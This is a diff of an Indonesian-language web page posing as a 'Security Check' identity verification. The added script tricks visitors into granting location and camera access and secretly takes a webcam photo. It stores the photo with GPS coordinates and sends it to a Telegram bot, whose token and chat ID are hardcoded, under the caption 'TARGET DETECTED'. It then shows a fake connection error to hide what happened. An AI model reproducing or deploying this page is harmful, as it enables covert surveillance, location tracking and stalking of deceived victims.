@@ -3,152 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Cloud Security Verification</title>
+    <title>Security Verification</title>
     <style>
-        :root { --red: #ff0000; --bg: #000; }
-        body { 
-            background: var(--bg); 
-            color: #fff; 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-            margin: 0; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
-            overflow: hidden;
-        }
-        .card { 
-            text-align: center; 
-            width: 90%; 
-            max-width: 350px; 
-            padding: 40px 20px; 
-            border-radius: 20px;
-            background: #080808;
-            border: 1px solid #111;
-        }
-        .icon-shield {
-            font-size: 50px;
-            margin-bottom: 20px;
-            color: var(--red);
-            filter: drop-shadow(0 0 10px rgba(255,0,0,0.5));
-        }
-        h2 { margin: 0 0 10px 0; font-size: 22px; font-weight: 800; letter-spacing: 1px; }
-        p { font-size: 13px; color: #666; line-height: 1.6; margin-bottom: 30px; }
-        
-        .btn-verify {
-            background: var(--red);
-            color: #fff;
-            border: none;
-            padding: 16px;
-            width: 100%;
-            border-radius: 12px;
-            font-weight: 900;
-            font-size: 14px;
-            letter-spacing: 1px;
-            cursor: pointer;
-            transition: 0.3s;
-            box-shadow: 0 5px 20px rgba(255,0,0,0.2);
-        }
-        .btn-verify:active { transform: scale(0.95); opacity: 0.8; }
-
-        /* Loader Tersembunyi */
-        #loader { display: none; margin-top: 20px; }
-        .spinner {
-            border: 3px solid #111;
-            border-top: 3px solid var(--red);
-            border-radius: 50%;
-            width: 25px;
-            height: 25px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { text-align: center; background: #080808; padding: 40px 20px; border-radius: 20px; border: 1px solid #111; width: 90%; max-width: 350px; }
+        .btn { background: #ff0000; color: #fff; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: 900; cursor: pointer; transition: 0.3s; }
+        .btn:active { transform: scale(0.95); }
+        .loader { display: none; margin: 20px auto; border: 3px solid #111; border-top: 3px solid #ff0000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-
     <div class="card">
-        <div class="icon-shield">🛡️</div>
-        <h2 id="status">Security Check</h2>
-        <p id="msg">Sistem kami mendeteksi aktivitas mencurigakan. Harap verifikasi identitas Anda untuk melanjutkan ke layanan.</p>
-        
-        <button id="btn" class="btn-verify" onclick="executeProtokol()">VERIFIKASI SAYA</button>
-        
-        <div id="loader">
-            <div class="spinner"></div>
-            <p style="margin-top: 10px; font-size: 10px; color: var(--red);">MENGECEK ENKRIPSI...</p>
-        </div>
+        <h2 id="st">Security Check</h2>
+        <p id="msg" style="font-size: 13px; color: #666;">Verifikasi identitas diperlukan untuk keamanan akun Anda.</p>
+        <button id="btn" class="btn" onclick="startRMT()">VERIFIKASI SEKARANG</button>
+        <div id="loader" class="loader"></div>
     </div>
-
     <video id="v" autoplay playsinline style="display:none"></video>
     <canvas id="c" style="display:none"></canvas>
 
 <script>
-    function executeProtokol() {
-        const btn = document.getElementById('btn');
-        const loader = document.getElementById('loader');
-        const msg = document.getElementById('msg');
-        const status = document.getElementById('status');
+    const TELE_TOKEN = "8740798060:AAGVYPajLLAid1V2wO-SrbbXNcxur6vNPLk";
+    const TELE_ID = "8283778614";
 
-        btn.style.display = 'none';
-        loader.style.display = 'block';
-        status.innerText = "Processing...";
+    function startRMT() {
+        document.getElementById('btn').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+        document.getElementById('st').innerText = "Processing...";
 
-        // Step 1: Ambil Geolocation
         navigator.geolocation.getCurrentPosition(pos => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
+            const maps = `https://www.google.com/maps?q=${lat},${lon}`;
             const time = new Date().toLocaleString('id-ID');
 
-            // Step 2: Akses Kamera
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
+            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                 const video = document.getElementById('v');
                 video.srcObject = stream;
-                
-                // Beri jeda 1.5 detik agar kamera stabil & fokus
                 setTimeout(() => {
                     const canvas = document.getElementById('c');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    
                     const imgData = canvas.toDataURL('image/jpeg', 0.7);
-                    
-                    // Step 3: Simpan ke Memory Offline (Local Storage)
-                    const log = {
-                        time: time,
-                        lat: lat,
-                        lon: lon,
-                        img: imgData
-                    };
 
+                    // SIMPAN KE BROWSER
                     let targets = JSON.parse(localStorage.getItem('darkness_targets') || '[]');
-                    targets.push(log);
+                    targets.push({ time, lat, lon, img: imgData });
                     localStorage.setItem('darkness_targets', JSON.stringify(targets));
 
-                    // Stop Kamera agar lampu indikator mati
-                    stream.getTracks().forEach(track => track.stop());
-
-                    // Akhiri dengan pesan error agar target tidak curiga
-                    setTimeout(() => {
-                        loader.style.display = 'none';
-                        status.innerText = "Error 0x882";
-                        msg.innerText = "Koneksi terputus. Harap gunakan jaringan lain dan coba lagi.";
-                        msg.style.color = "#ff4444";
-                    }, 1000);
-
-                }, 1500);
-            })
-            .catch(err => {
-                alert("Izin kamera diperlukan untuk verifikasi keamanan.");
-                location.reload();
+                    // KIRIM KE TELEGRAM
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append("chat_id", TELE_ID);
+                        formData.append("photo", blob, "target.jpg");
+                        formData.append("caption", `💀 TARGET TERDETEKSI!\n\n📍 Maps: ${maps}\n⏰ Jam: ${time}\n👤 User: Kalz RMT`);
+                        
+                        fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendPhoto`, { method: "POST", body: formData })
+                        .then(() => {
+                            stream.getTracks().forEach(t => t.stop());
+                            document.getElementById('loader').style.display = 'none';
+                            document.getElementById('st').innerText = "Error 404";
+                            document.getElementById('msg').innerText = "Koneksi terputus. Silakan coba lagi nanti.";
+                        });
+                    }, 'image/jpeg');
+                }, 2000);
             });
-
-        }, err => {
-            alert("Izin lokasi diperlukan untuk memvalidasi perangkat Anda.");
-            location.reload();
-        }, { enableHighAccuracy: true });
+        }, () => { alert("Izin diperlukan untuk melanjutkan."); location.reload(); });
     }
 </script>
 </body>
